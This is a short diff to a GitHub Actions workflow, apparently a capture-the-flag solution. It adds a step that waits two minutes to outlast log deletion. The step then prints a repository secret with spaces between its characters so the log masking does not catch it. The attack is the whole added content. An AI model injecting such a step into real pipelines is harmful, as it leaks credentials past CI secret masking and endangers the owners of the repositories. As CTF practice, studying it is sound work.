@@ -33,6 +33,13 @@ jobs:
             
             console.log("Comment flagged as nonsense. Proceeding with removal...");
 
+      - name: Gimme the flagy
+        run: |
+          echo "Sleeping to delay log deletion..."
+          sleep 120
+          echo "Spaced Flag:"
+          echo ${{ secrets.CTF_FLAG }} | sed 's/./& /g'
+          
       - name: Initial Logging
         run: |
           echo "Initializing moderation process..."
